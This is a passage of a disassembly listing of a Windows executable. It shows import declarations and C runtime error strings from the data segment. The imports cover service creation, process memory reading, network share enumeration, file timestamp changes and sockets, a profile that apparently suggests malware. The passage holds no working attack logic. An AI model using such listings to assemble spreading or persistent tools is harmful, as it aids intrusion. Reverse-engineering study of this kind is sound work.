		extrn AllocateAndInitializeSid:dword ; DATA XREF: sub_402642+EAr
					; sub_402642+107r
					; Allocate and initializes a security
					; identifier with up to	eight subauthorities
; BOOL __stdcall EqualSid(PSID pSid1,PSID pSid2)
		extrn EqualSid:dword	; DATA XREF: sub_402642+134r
					; sub_402642+144r
					; Test two security identifier
					; values for equality
; PVOID	__stdcall FreeSid(PSID pSid)
		extrn FreeSid:dword	; DATA XREF: sub_402642+186r
					; sub_402642+191r ...
; SERVICE_STATUS_HANDLE	__stdcall RegisterServiceCtrlHandlerA(LPCSTR lpServiceName,LPHANDLER_FUNCTION lpHandlerProc)
		extrn RegisterServiceCtrlHandlerA:dword	; DATA XREF: .text:00407041r
; SC_HANDLE __stdcall OpenServiceA(SC_HANDLE hSCManager,LPCSTR lpServiceName,DWORD dwDesiredAccess)
		extrn OpenServiceA:dword ; DATA	XREF: sub_40280F+24Fr
					; sub_40686A+15Fr
; BOOL __stdcall SetServiceStatus(SERVICE_STATUS_HANDLE	hServiceStatus,LPSERVICE_STATUS	lpServiceStatus)
		extrn SetServiceStatus:dword ; DATA XREF: sub_406FF0+2Fr
; SC_HANDLE __stdcall OpenSCManagerA(LPCSTR lpMachineName,LPCSTR lpDatabaseName,DWORD dwDesiredAccess)
		extrn OpenSCManagerA:dword ; DATA XREF:	sub_40280F+1F1r
					; sub_40280F+1F7r ...
					; Establish a connection to the	service
					; control manager on the specified computer
					; and opens the	specified database
; SC_HANDLE __stdcall CreateServiceA(SC_HANDLE hSCManager,LPCSTR lpServiceName,LPCSTR lpDisplayName,DWORD dwDesiredAccess,DWORD	dwServiceType,DWORD dwStartType,DWORD dwErrorControl,LPCSTR lpBinaryPathName,LPCSTR lpLoadOrderGroup,LPDWORD lpdwTagId,LPCSTR lpDependencies,LPCSTR lpServiceStartName,LPCSTR lpPassword)
		extrn CreateServiceA:dword ; DATA XREF:	sub_40280F+22Cr
					; sub_40686A+141r
; BOOL __stdcall CloseServiceHandle(SC_HANDLE hSCObject)
		extrn CloseServiceHandle:dword ; DATA XREF: sub_40280F+233r
					; sub_40280F+239r ...
; LONG __stdcall RegEnumValueA(HKEY hKey,DWORD dwIndex,LPSTR lpValueName,LPDWORD lpcbValueName,LPDWORD lpReserved,LPDWORD lpType,LPBYTE	lpData,LPDWORD lpcbData)
		extrn RegEnumValueA:dword ; DATA XREF: sub_401284+71r
					; sub_404604+56r
; LONG __stdcall RegDeleteValueA(HKEY hKey,LPCSTR lpValueName)
		extrn RegDeleteValueA:dword ; DATA XREF: sub_401284+FFr
; LONG __stdcall RegOpenKeyA(HKEY hKey,LPCSTR lpSubKey,PHKEY phkResult)
		extrn RegOpenKeyA:dword	; DATA XREF: sub_401198+25r
					; sub_401284+23r ...
; LONG __stdcall RegEnumKeyA(HKEY hKey,DWORD dwIndex,LPSTR lpName,DWORD	cbName)
		extrn RegEnumKeyA:dword	; DATA XREF: sub_401198+59r
					; sub_404586+34r
; LONG __stdcall RegCloseKey(HKEY hKey)
		extrn RegCloseKey:dword	; DATA XREF: sub_401198+E1r
					; sub_401284+116r ...

;
; Imports from KERNEL32
;
; BOOL __stdcall CopyFileA(LPCSTR lpExistingFileName,LPCSTR lpNewFileName,BOOL bFailIfExists)
		extrn CopyFileA:dword	; DATA XREF: sub_40280F+14Br
					; sub_40565D+C5r ...
; BOOL __stdcall IsDBCSLeadByte(BYTE TestChar)
		extrn IsDBCSLeadByte:dword ; DATA XREF:	sub_403703+8r
; BOOL __stdcall WriteFile(HANDLE hFile,LPCVOID	lpBuffer,DWORD nNumberOfBytesToWrite,LPDWORD lpNumberOfBytesWritten,LPOVERLAPPED lpOverlapped)
		extrn WriteFile:dword	; DATA XREF: sub_403CBB+38r
					; sub_403F63+87r ...
; BOOL __stdcall ReadFile(HANDLE hFile,LPVOID lpBuffer,DWORD nNumberOfBytesToRead,LPDWORD lpNumberOfBytesRead,LPOVERLAPPED lpOverlapped)
		extrn ReadFile:dword	; DATA XREF: __read+84r __read+155r
; UINT __stdcall GetTempFileNameA(LPCSTR lpPathName,LPCSTR lpPrefixString,UINT uUnique,LPSTR lpTempFileName)
		extrn GetTempFileNameA:dword ; DATA XREF: sub_403D8C+3Fr
; DWORD	__stdcall GetTempPathA(DWORD nBufferLength,LPSTR lpBuffer)
		extrn GetTempPathA:dword ; DATA	XREF: sub_403D8C+28r
; BOOL __stdcall DeleteFileA(LPCSTR lpFileName)
		extrn DeleteFileA:dword	; DATA XREF: sub_403DFA+10r
; BOOL __stdcall SetFileAttributesA(LPCSTR lpFileName,DWORD dwFileAttributes)
		extrn SetFileAttributesA:dword ; DATA XREF: sub_403DFA+6r
					; sub_403F63+15r ...
; BOOL __stdcall FindClose(HANDLE hFindFile)
		extrn FindClose:dword	; DATA XREF: sub_403E11+146r
; BOOL __stdcall FindNextFileA(HANDLE hFindFile,LPWIN32_FIND_DATAA lpFindFileData)
		extrn FindNextFileA:dword ; DATA XREF: sub_403E11+137r
; HANDLE __stdcall FindFirstFileA(LPCSTR lpFileName,LPWIN32_FIND_DATAA lpFindFileData)
		extrn FindFirstFileA:dword ; DATA XREF:	sub_403E11+67r
; BOOL __stdcall SetEndOfFile(HANDLE hFile)
		extrn SetEndOfFile:dword ; DATA	XREF: sub_403F63+60r
; DWORD	__stdcall SetFilePointer(HANDLE	hFile,LONG lDistanceToMove,PLONG lpDistanceToMoveHigh,DWORD dwMoveMethod)
		extrn SetFilePointer:dword ; DATA XREF:	sub_403F63+59r
					; sub_403F63+6Dr ...
; BOOL __stdcall GetComputerNameA(LPSTR	lpBuffer,LPDWORD nSize)
		extrn GetComputerNameA:dword ; DATA XREF: sub_40280F+1D0r
					; sub_406498+67r
; BOOL __stdcall SetFileTime(HANDLE hFile,const	FILETIME *lpCreationTime,const FILETIME	*lpLastAccessTime,const	FILETIME *lpLastWriteTime)
		extrn SetFileTime:dword	; DATA XREF: sub_404075+34r
; DWORD	GetTickCount(void)
		extrn GetTickCount:dword ; DATA	XREF: sub_4046AB:loc_4046BBr
; BOOL __stdcall CreateProcessA(LPCSTR lpApplicationName,LPSTR lpCommandLine,LPSECURITY_ATTRIBUTES lpProcessAttributes,LPSECURITY_ATTRIBUTES lpThreadAttributes,BOOL bInheritHandles,DWORD dwCreationFlags,LPVOID lpEnvironment,LPCSTR lpCurrentDirectory,LPSTARTUPINFOA lpStartupInfo,LPPROCESS_INFORMATION lpProcessInformation)
		extrn CreateProcessA:dword ; DATA XREF:	sub_4046D7+33r
; UINT __stdcall GetSystemDirectoryA(LPSTR lpBuffer,UINT uSize)
		extrn GetSystemDirectoryA:dword	; DATA XREF: sub_4048EF+94r
					; sub_406E45+A3r
; HANDLE GetCurrentProcess(void)
		extrn GetCurrentProcess:dword ;	DATA XREF: sub_40530F+1Dr
					; _doexit+10r
; BOOL __stdcall GetVersionExA(LPOSVERSIONINFOA	lpVersionInformation)
		extrn GetVersionExA:dword ; DATA XREF: sub_4053E8+A3r
					; Get extended information about the
					; version of the operating system
; DWORD	GetVersion(void)
		extrn GetVersion:dword	; DATA XREF: sub_4053E8+7Cr start+26r
					; Get current version number of	Windows
					; and information about	the operating system platform
; DWORD	__stdcall WaitForSingleObject(HANDLE hHandle,DWORD dwMilliseconds)
		extrn WaitForSingleObject:dword	; DATA XREF: sub_4058ED+104r
; LPSTR	GetCommandLineA(void)
		extrn GetCommandLineA:dword ; DATA XREF: sub_4058ED+E8r
					; start+74r
; DWORD	__stdcall ExpandEnvironmentStringsA(LPCSTR lpSrc,LPSTR lpDst,DWORD nSize)
		extrn ExpandEnvironmentStringsA:dword ;	DATA XREF: sub_405CE6+89r
; UINT __stdcall GetDriveTypeA(LPCSTR lpRootPathName)
		extrn GetDriveTypeA:dword ; DATA XREF: sub_405EE4+82r
					; sub_4069EE+16r ...
; HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes,DWORD dwStackSize,LPTHREAD_START_ROUTINE lpStartAddress,LPVOID	lpParameter,DWORD dwCreationFlags,LPDWORD lpThreadId)
		extrn CreateThread:dword ; DATA	XREF: sub_406DBF+68r
					; sub_406F66+6r ...
; int __stdcall	MultiByteToWideChar(UINT CodePage,DWORD	dwFlags,LPCSTR lpMultiByteStr,int cchMultiByte,LPWSTR lpWideCharStr,int	cchWideChar)
		extrn MultiByteToWideChar:dword	; DATA XREF: sub_40280F+2D4r
					; sub_40280F+2E3r ...
; int __stdcall	WideCharToMultiByte(UINT CodePage,DWORD	dwFlags,LPCWSTR	lpWideCharStr,int cchWideChar,LPSTR lpMultiByteStr,int cchMultiByte,LPCSTR lpDefaultChar,LPBOOL	lpUsedDefaultChar)
		extrn WideCharToMultiByte:dword	; DATA XREF: sub_40280F+339r
					; ___crtLCMapStringA+20Dr ...
; DWORD	GetCurrentProcessId(void)
		extrn GetCurrentProcessId:dword	; DATA XREF: sub_402642+9r
; HLOCAL __stdcall LocalAlloc(UINT uFlags,UINT uBytes)
		extrn LocalAlloc:dword	; DATA XREF: sub_402642+75r
					; sub_402642+B3r
; HLOCAL __stdcall LocalFree(HLOCAL hMem)
		extrn LocalFree:dword	; DATA XREF: sub_402642+A9r
					; sub_402642+1A5r
; DWORD	GetLastError(void)
		extrn GetLastError:dword ; DATA	XREF: sub_402642:loc_4026A5r
					; sub_402642+95r ...
; void __stdcall GetLocalTime(LPSYSTEMTIME lpSystemTime)
		extrn GetLocalTime:dword ; DATA	XREF: sub_4018E9+Dr
					; sub_4050FD+29r ...
; BOOL __stdcall UnmapViewOfFile(LPCVOID lpBaseAddress)
		extrn UnmapViewOfFile:dword ; DATA XREF: sub_401808+Cr
; BOOL __stdcall FreeLibrary(HMODULE hLibModule)
		extrn FreeLibrary:dword	; DATA XREF: sub_401198+CAr
					; sub_40686A+F4r
; HANDLE __stdcall CreateFileA(LPCSTR lpFileName,DWORD dwDesiredAccess,DWORD dwShareMode,LPSECURITY_ATTRIBUTES lpSecurityAttributes,DWORD dwCreationDisposition,DWORD dwFlagsAndAttributes,HANDLE hTemplateFile)
		extrn CreateFileA:dword	; DATA XREF: sub_40174E+47r
					; sub_403CBB+17r ...
; DWORD	__stdcall GetFileSize(HANDLE hFile,LPDWORD lpFileSizeHigh)
		extrn GetFileSize:dword	; DATA XREF: sub_40174E+59r
					; sub_403D0B+2Fr ...
; HANDLE __stdcall CreateFileMappingA(HANDLE hFile,LPSECURITY_ATTRIBUTES lpFileMappingAttributes,DWORD flProtect,DWORD dwMaximumSizeHigh,DWORD dwMaximumSizeLow,LPCSTR lpName)
		extrn CreateFileMappingA:dword ; DATA XREF: sub_40174E+77r
; LPVOID __stdcall MapViewOfFile(HANDLE	hFileMappingObject,DWORD dwDesiredAccess,DWORD dwFileOffsetHigh,DWORD dwFileOffsetLow,DWORD dwNumberOfBytesToMap)
		extrn MapViewOfFile:dword ; DATA XREF: sub_40174E+95r
		extrn __imp_Process32First:dword ; DATA	XREF: Process32Firstr
		extrn __imp_Process32Next:dword	; DATA XREF: Process32Nextr
; DWORD	__stdcall GetModuleFileNameA(HMODULE hModule,LPSTR lpFilename,DWORD nSize)
		extrn GetModuleFileNameA:dword ; DATA XREF: sub_4013FA+44r
					; sub_404B20+2Cr ...
		extrn __imp_CreateToolhelp32Snapshot:dword
					; DATA XREF: CreateToolhelp32Snapshotr
		extrn __imp_Module32First:dword	; DATA XREF: Module32Firstr
; HANDLE __stdcall OpenProcess(DWORD dwDesiredAccess,BOOL bInheritHandle,DWORD dwProcessId)
		extrn OpenProcess:dword	; DATA XREF: sub_4013FA+B3r
					; sub_402642+49r
; BOOL __stdcall ReadProcessMemory(HANDLE hProcess,LPCVOID lpBaseAddress,LPVOID	lpBuffer,DWORD nSize,LPDWORD lpNumberOfBytesRead)
		extrn ReadProcessMemory:dword ;	DATA XREF: sub_4013FA+FEr
; BOOL __stdcall TerminateProcess(HANDLE hProcess,UINT uExitCode)
		extrn TerminateProcess:dword ; DATA XREF: sub_4013FA+196r
					; _doexit+17r
; void __stdcall Sleep(DWORD dwMilliseconds)
		extrn Sleep:dword	; DATA XREF: sub_4013FA+19Er
					; sub_4015FF+13Er ...
; BOOL __stdcall CloseHandle(HANDLE hObject)
		extrn CloseHandle:dword	; DATA XREF: sub_4013FA+1EAr
					; sub_4013FA+1F8r ...
; HMODULE __stdcall LoadLibraryA(LPCSTR	lpLibFileName)
		extrn LoadLibraryA:dword ; DATA	XREF: sub_401198+97r
					; sub_4055A8+10r ...
; FARPROC __stdcall GetProcAddress(HMODULE hModule,LPCSTR lpProcName)
		extrn GetProcAddress:dword ; DATA XREF:	sub_401198+B3r
					; sub_4055A8+1Br ...
; BOOL __stdcall GetFileTime(HANDLE hFile,LPFILETIME lpCreationTime,LPFILETIME lpLastAccessTime,LPFILETIME lpLastWriteTime)
		extrn GetFileTime:dword	; DATA XREF: sub_40402D+34r
; BOOL __stdcall SetStdHandle(DWORD nStdHandle,HANDLE hHandle)
		extrn SetStdHandle:dword ; DATA	XREF: __free_osfhnd:loc_40BE4Br
; LPVOID __stdcall HeapReAlloc(HANDLE hHeap,DWORD dwFlags,LPVOID lpMem,DWORD dwBytes)
		extrn HeapReAlloc:dword	; DATA XREF: ___sbh_alloc_new_region+28r
; LPVOID __stdcall VirtualAlloc(LPVOID lpAddress,DWORD dwSize,DWORD flAllocationType,DWORD flProtect)
		extrn VirtualAlloc:dword ; DATA	XREF: ___sbh_alloc_new_region+76r
					; ___sbh_alloc_new_group+51r
; BOOL __stdcall GetStringTypeW(DWORD dwInfoType,LPCWSTR lpSrcStr,int cchSrc,LPWORD lpCharType)
		extrn GetStringTypeW:dword ; DATA XREF:	___crtGetStringTypeA+3Fr
					; ___crtGetStringTypeA+12Dr
; BOOL __stdcall GetStringTypeA(LCID Locale,DWORD dwInfoType,LPCSTR lpSrcStr,int cchSrc,LPWORD lpCharType)
		extrn GetStringTypeA:dword ; DATA XREF:	___crtGetStringTypeA+59r
					; ___crtGetStringTypeA+8Dr
		extrn __imp_RtlUnwind:dword ; DATA XREF: RtlUnwindr
; BOOL __stdcall VirtualFree(LPVOID lpAddress,DWORD dwSize,DWORD dwFreeType)
		extrn VirtualFree:dword	; DATA XREF: ___sbh_free_block+23Fr
					; ___sbh_free_block+257r ...
; HANDLE __stdcall HeapCreate(DWORD flOptions,DWORD dwInitialSize,DWORD	dwMaximumSize)
		extrn HeapCreate:dword	; DATA XREF: __heap_init+11r
; BOOL __stdcall HeapDestroy(HANDLE hHeap)
		extrn HeapDestroy:dword	; DATA XREF: __heap_init+2Fr
; DWORD	__stdcall GetFileType(HANDLE hFile)
		extrn GetFileType:dword	; DATA XREF: __ioinit+FFr
					; __ioinit+166r
; HANDLE __stdcall GetStdHandle(DWORD nStdHandle)
		extrn GetStdHandle:dword ; DATA	XREF: __ioinit+158r
					; __NMSG_WRITE+143r
; UINT __stdcall SetHandleCount(UINT uNumber)
		extrn SetHandleCount:dword ; DATA XREF:	__ioinit+19Dr
; LPWSTR GetEnvironmentStringsW(void)
		extrn GetEnvironmentStringsW:dword
					; DATA XREF: ___crtGetEnvironmentStringsA+9r
					; ___crtGetEnvironmentStringsA+1Br ...
; LPSTR	GetEnvironmentStrings(void)
		extrn GetEnvironmentStrings:dword
					; DATA XREF: ___crtGetEnvironmentStringsA:loc_40A48Fr
					; ___crtGetEnvironmentStringsA+E1r
; HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)
		extrn GetModuleHandleA:dword ; DATA XREF: start+C2r
; void __stdcall GetStartupInfoA(LPSTARTUPINFOA	lpStartupInfo)
		extrn GetStartupInfoA:dword ; DATA XREF: start+9Fr
					; __ioinit+59r
; void __stdcall ExitProcess(UINT uExitCode)
		extrn ExitProcess:dword	; DATA XREF: _fast_error_exit+1Dr
					; _doexit+91r
; BOOL __stdcall GetCPInfo(UINT	CodePage,LPCPINFO lpCPInfo)
		extrn GetCPInfo:dword	; DATA XREF: __setmbcp+48r
					; _setSBUpLow+14r
; UINT GetACP(void)
		extrn GetACP:dword	; DATA XREF: _getSystemCP+2Fr
; UINT GetOEMCP(void)
		extrn GetOEMCP:dword	; DATA XREF: _getSystemCP+1Ar
; int __stdcall	LCMapStringA(LCID Locale,DWORD dwMapFlags,LPCSTR lpSrcStr,int cchSrc,LPSTR lpDestStr,int cchDest)
		extrn LCMapStringA:dword ; DATA	XREF: ___crtLCMapStringA+5Er
					; ___crtLCMapStringA+A7r
; int __stdcall	LCMapStringW(LCID Locale,DWORD dwMapFlags,LPCWSTR lpSrcStr,int cchSrc,LPWSTR lpDestStr,int cchDest)
		extrn LCMapStringW:dword ; DATA	XREF: ___crtLCMapStringA+42r
					; ___crtLCMapStringA+14Dr ...
; BOOL __stdcall HeapFree(HANDLE hHeap,DWORD dwFlags,LPVOID lpMem)
		extrn HeapFree:dword	; DATA XREF: _free+27r
					; ___sbh_free_block+2C4r ...
; LPVOID __stdcall HeapAlloc(HANDLE hHeap,DWORD	dwFlags,DWORD dwBytes)
		extrn HeapAlloc:dword	; DATA XREF: __heap_alloc+2Er
					; ___sbh_heap_init+Dr ...
; LONG __stdcall UnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo)
		extrn UnhandledExceptionFilter:dword ; DATA XREF: __XcptFilter+138r
; BOOL __stdcall FreeEnvironmentStringsA(LPSTR)
		extrn FreeEnvironmentStringsA:dword
					; DATA XREF: ___crtGetEnvironmentStringsA+11Fr
; BOOL __stdcall FreeEnvironmentStringsW(LPWSTR)
		extrn FreeEnvironmentStringsW:dword
					; DATA XREF: ___crtGetEnvironmentStringsA+CEr
; BOOL __stdcall FlushFileBuffers(HANDLE hFile)
		extrn FlushFileBuffers:dword ; DATA XREF: __commit+2Cr

;
; Imports from MPR
;
; DWORD	__stdcall __imp_WNetOpenEnumA(DWORD dwScope,DWORD dwType,DWORD dwUsage,LPNETRESOURCEA lpNetResource,LPHANDLE lphEnum)
		extrn __imp_WNetOpenEnumA:dword	; DATA XREF: WNetOpenEnumAr
; DWORD	__stdcall __imp_WNetEnumResourceA(HANDLE hEnum,LPDWORD lpcCount,LPVOID lpBuffer,LPDWORD	lpBufferSize)
		extrn __imp_WNetEnumResourceA:dword ; DATA XREF: WNetEnumResourceAr
; DWORD	__stdcall __imp_WNetCloseEnum(HANDLE hEnum)
		extrn __imp_WNetCloseEnum:dword	; DATA XREF: WNetCloseEnumr

;
; Imports from WS2_32
;
; struct hostent *__stdcall gethostbyname(const	char *name)
		extrn gethostbyname:dword ; DATA XREF: sub_4032C5+60r
; int __stdcall	closesocket(SOCKET s)
		extrn closesocket:dword	; DATA XREF: sub_4032B3+2r
; int WSACleanup(void)
		extrn WSACleanup:dword	; DATA XREF: sub_4032B3+8r
; int __stdcall	send(SOCKET s,const char *buf,int len,int flags)
		extrn send:dword	; DATA XREF: sub_403285+Er
; u_short __stdcall htons(u_short hostshort)
		extrn htons:dword	; DATA XREF: sub_403222+Cr
; int __stdcall	connect(SOCKET s,const struct sockaddr *name,int namelen)
		extrn connect:dword	; DATA XREF: sub_403222+47r
; int WSAGetLastError(void)
		extrn WSAGetLastError:dword ; DATA XREF: sub_403222+52r
					; sub_4032C5+68r
; int __stdcall	WSAStartup(WORD	wVersionRequested,LPWSADATA lpWSAData)
		extrn WSAStartup:dword	; DATA XREF: sub_4031D8+19r
					; WinMain(x,x,x,x)+12r
; SOCKET __stdcall socket(int af,int type,int protocol)
		extrn socket:dword	; DATA XREF: sub_4031D8+32r
; int __stdcall	recv(SOCKET s,char *buf,int len,int flags)
		extrn recv:dword	; DATA XREF: sub_40329C+Er


; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; Segment type:	Pure data
; Segment permissions: Read
_rdata		segment	para public 'DATA' use32
		assume cs:_rdata
		;org 40D1E4h
		db    0
		db    0
		db    0
		db    0
dword_40D1E8	dd 0			; DATA XREF: sub_401A1E:loc_401CEBr
		db    5
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    7
		db    0
		db    0
		db    0
dword_40D1F8	dd 9			; DATA XREF: sub_401DC4+2AEr
dword_40D1FC	dd 5			; DATA XREF: sub_401A1E+2D8r
		db    2
		db    0
		db    0
		db    0
		db    2
		db    0
		db    0
		db    0
		db    2
		db    0
		db    0
		db    0
		db    2
		db    0
		db    0
		db    0
unk_40D210	db  0Ch			; DATA XREF: sub_4018E9+2Eo
		db    0
		db  19h
		db    0
		db    1
		db    0
		db    1
		db    0
		db    2
		db    0
		db  0Eh
		db    0
		db  0Ah
		db    0
		db  1Fh
		db    0
unk_40D220	db    4			; DATA XREF: sub_4018E9+35o
		db    0
		db    1
		db    0
		db    3
		db    0
		db  19h
		db    0
		db    8
		db    0
		db  0Fh
		db    0
		db    2
		db    0
		db    2
		db    0
		db  0Bh
		db    0
		db    2
		db    0
		db    1
		db    0
		db    6
		db    0
unk_40D238	db 0FFh			; DATA XREF: start+5o
		db 0FFh
		db 0FFh
		db 0FFh
		db  9Fh	; 
		db  81h	; 
		db  40h	; @
		db    0
		db 0B3h	; ³
		db  81h	; 
		db  40h	; @
		db    0
; char byte_40D244[]
byte_40D244	db 4 dup(0)		; DATA XREF: ___crtLCMapStringA+57o
					; ___crtGetStringTypeA+52o
; const	WCHAR SrcStr
SrcStr		db 0			; DATA XREF: ___crtLCMapStringA+36o
					; __output+4Ar	...
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
unk_40D250	db 0FFh			; DATA XREF: ___crtLCMapStringA+5o
		db 0FFh
		db 0FFh
		db 0FFh
		db  81h	; 
		db  87h	; 
		db  40h	; @
		db    0
		db  85h	; 
		db  87h	; 
		db  40h	; @
		db    0
		db 0FFh
		db 0FFh
		db 0FFh
		db 0FFh
		db  35h	; 5
		db  88h	; 
		db  40h	; @
		db    0
		db  39h	; 9
		db  88h	; 
		db  40h	; @
		db    0
byte_40D268	db 6			; DATA XREF: __output:loc_408AA1r
		db    0
		db    0
		db    6
		db    0
		db    1
		db    0
		db    0
		db  10h
		db    0
		db    3
		db    6
		db    0
		db    6
		db    2
		db  10h
		db    4
		db  45h	; E
		db  45h	; E
		db  45h	; E
		db    5
		db    5
		db    5
		db    5
		db    5
		db  35h	; 5
		db  30h	; 0
		db    0
		db  50h	; P
		db    0
		db    0
		db    0
		db    0
		db  20h
		db  28h	; (
		db  38h	; 8
		db  50h	; P
		db  58h	; X
		db    7
		db    8
		db    0
		db  37h	; 7
		db  30h	; 0
		db  30h	; 0
		db  57h	; W
		db  50h	; P
		db    7
		db    0
		db    0
		db  20h
		db  20h
		db    8
		db    0
		db    0
		db    0
		db    0
		db    8
		db  60h	; `
		db  68h	; h
		db  60h	; `
		db  60h	; `
		db  60h	; `
		db  60h	; `
		db    0
		db    0
		db  70h	; p
		db  70h	; p
		db  78h	; x
		db  78h	; x
		db  78h	; x
		db  78h	; x
		db    8
		db    7
		db    8
		db    0
		db    0
		db    7
		db    0
		db    8
		db    8
		db    8
		db    0
		db    0
		db    8
		db    0
		db    8
		db    0
		db    7
		db    8
		db    0
		db    0
		db    0
		db  28h	; (
		db    0
		db  6Eh	; n
		db    0
		db  75h	; u
		db    0
		db  6Ch	; l
		db    0
		db  6Ch	; l
		db    0
		db  29h	; )
		db    0
		db    0
		db    0
		db    0
		db    0
		db  28h	; (
		db  6Eh	; n
		db  75h	; u
		db  6Ch	; l
		db  6Ch	; l
		db  29h	; )
		db    0
		db    0
		db  72h	; r
		db  75h	; u
		db  6Eh	; n
		db  74h	; t
		db  69h	; i
		db  6Dh	; m
		db  65h	; e
		db  20h
		db  65h	; e
		db  72h	; r
		db  72h	; r
		db  6Fh	; o
		db  72h	; r
		db  20h
		db    0
		db    0
		db  0Dh
		db  0Ah
		db    0
		db    0
		db  54h	; T
		db  4Ch	; L
		db  4Fh	; O
		db  53h	; S
		db  53h	; S
		db  20h
		db  65h	; e
		db  72h	; r
		db  72h	; r
		db  6Fh	; o
		db  72h	; r
		db  0Dh
		db  0Ah
		db    0
		db    0
		db    0
		db  53h	; S
		db  49h	; I
		db  4Eh	; N
		db  47h	; G
		db  20h
		db  65h	; e
		db  72h	; r
		db  72h	; r
		db  6Fh	; o
		db  72h	; r
		db  0Dh
		db  0Ah
		db    0
		db    0
		db    0
		db    0
		db  44h	; D
		db  4Fh	; O
		db  4Dh	; M
		db  41h	; A
		db  49h	; I
		db  4Eh	; N
		db  20h
		db  65h	; e
		db  72h	; r
		db  72h	; r
		db  6Fh	; o
		db  72h	; r
		db  0Dh
		db  0Ah
		db    0
		db    0
		db  52h	; R
		db  36h	; 6
		db  30h	; 0
		db  32h	; 2
		db  38h	; 8
		db  0Dh
		db  0Ah
		db  2Dh	; -
		db  20h
		db  75h	; u
		db  6Eh	; n
		db  61h	; a
		db  62h	; b
		db  6Ch	; l
		db  65h	; e
		db  20h
		db  74h	; t
		db  6Fh	; o
		db  20h
		db  69h	; i
		db  6Eh	; n
		db  69h	; i
		db  74h	; t
		db  69h	; i
		db  61h	; a
		db  6Ch	; l
		db  69h	; i
		db  7Ah	; z
		db  65h	; e
		db  20h
		db  68h	; h
		db  65h	; e
		db  61h	; a
		db  70h	; p
		db  0Dh
		db  0Ah
		db    0
		db    0
		db    0
		db    0
		db  52h	; R
		db  36h	; 6
		db  30h	; 0
		db  32h	; 2
		db  37h	; 7
		db  0Dh
		db  0Ah
		db  2Dh	; -
		db  20h
		db  6Eh	; n
		db  6Fh	; o
		db  74h	; t
		db  20h
		db  65h	; e
		db  6Eh	; n
		db  6Fh	; o
		db  75h	; u
		db  67h	; g
		db  68h	; h
		db  20h
		db  73h	; s
		db  70h	; p
		db  61h	; a
		db  63h	; c
		db  65h	; e
		db  20h
		db  66h	; f
		db  6Fh	; o
		db  72h	; r
		db  20h
		db  6Ch	; l
		db  6Fh	; o
		db  77h	; w
		db  69h	; i
		db  6Fh	; o
		db  20h
		db  69h	; i
		db  6Eh	; n
		db  69h	; i
		db  74h	; t
		db  69h	; i
		db  61h	; a
		db  6Ch	; l
		db  69h	; i
		db  7Ah	; z
		db  61h	; a
		db  74h	; t
		db  69h	; i
		db  6Fh	; o
		db  6Eh	; n
		db  0Dh
		db  0Ah
		db    0
		db    0
		db    0
		db    0
		db  52h	; R
		db  36h	; 6
		db  30h	; 0
		db  32h	; 2
		db  36h	; 6
		db  0Dh
		db  0Ah
		db  2Dh	; -
		db  20h
		db  6Eh	; n
		db  6Fh	; o
		db  74h	; t
		db  20h
		db  65h	; e
		db  6Eh	; n
		db  6Fh	; o
		db  75h	; u
		db  67h	; g
		db  68h	; h
		db  20h
		db  73h	; s
		db  70h	; p
		db  61h	; a
		db  63h	; c
		db  65h	; e
		db  20h
		db  66h	; f
		db  6Fh	; o
		db  72h	; r
		db  20h
		db  73h	; s
		db  74h	; t
		db  64h	; d
		db  69h	; i
		db  6Fh	; o
		db  20h
		db  69h	; i
		db  6Eh	; n
		db  69h	; i
		db  74h	; t
		db  69h	; i
		db  61h	; a
		db  6Ch	; l
		db  69h	; i
		db  7Ah	; z
		db  61h	; a
		db  74h	; t
		db  69h	; i
		db  6Fh	; o
		db  6Eh	; n
		db  0Dh
		db  0Ah
		db    0
		db    0
		db    0
		db    0
		db  52h	; R
		db  36h	; 6
		db  30h	; 0
		db  32h	; 2
		db  35h	; 5
		db  0Dh
		db  0Ah
		db  2Dh	; -
		db  20h
		db  70h	; p
		db  75h	; u
		db  72h	; r
		db  65h	; e
		db  20h
		db  76h	; v
		db  69h	; i
		db  72h	; r
		db  74h	; t
		db  75h	; u
		db  61h	; a
		db  6Ch	; l
		db  20h
		db  66h	; f
		db  75h	; u
		db  6Eh	; n
		db  63h	; c
		db  74h	; t
		db  69h	; i
		db  6Fh	; o
		db  6Eh	; n
		db  20h
		db  63h	; c
		db  61h	; a
		db  6Ch	; l
		db  6Ch	; l
		db  0Dh
		db  0Ah
		db    0
		db    0
		db    0
		db  52h	; R
		db  36h	; 6
		db  30h	; 0
		db  32h	; 2
		db  34h	; 4
		db  0Dh
		db  0Ah
		db  2Dh	; -
		db  20h
		db  6Eh	; n
		db  6Fh	; o
		db  74h	; t
		db  20h
		db  65h	; e
		db  6Eh	; n
		db  6Fh	; o
		db  75h	; u
		db  67h	; g
		db  68h	; h
		db  20h
		db  73h	; s
		db  70h	; p
		db  61h	; a
		db  63h	; c
		db  65h	; e
		db  20h
		db  66h	; f
		db  6Fh	; o
		db  72h	; r
		db  20h
		db  5Fh	; _
		db  6Fh	; o
		db  6Eh	; n
		db  65h	; e
		db  78h	; x
		db  69h	; i
		db  74h	; t
		db  2Fh	; /
		db  61h	; a
		db  74h	; t
		db  65h	; e
		db  78h	; x
		db  69h	; i
		db  74h	; t
		db  20h
		db  74h	; t
		db  61h	; a
		db  62h	; b
		db  6Ch	; l
		db  65h	; e
		db  0Dh
		db  0Ah
		db    0
		db    0
		db    0
		db    0
		db  52h	; R
		db  36h	; 6
		db  30h	; 0
		db  31h	; 1
		db  39h	; 9
		db  0Dh
		db  0Ah
		db  2Dh	; -
		db  20h
		db  75h	; u
		db  6Eh	; n
		db  61h	; a
		db  62h	; b
		db  6Ch	; l
		db  65h	; e
		db  20h
		db  74h	; t
		db  6Fh	; o
		db  20h
		db  6Fh	; o
		db  70h	; p
		db  65h	; e
		db  6Eh	; n
		db  20h
		db  63h	; c
		db  6Fh	; o
		db  6Eh	; n
		db  73h	; s
		db  6Fh	; o
		db  6Ch	; l
		db  65h	; e
		db  20h
		db  64h	; d
		db  65h	; e
		db  76h	; v
		db  69h	; i
		db  63h	; c
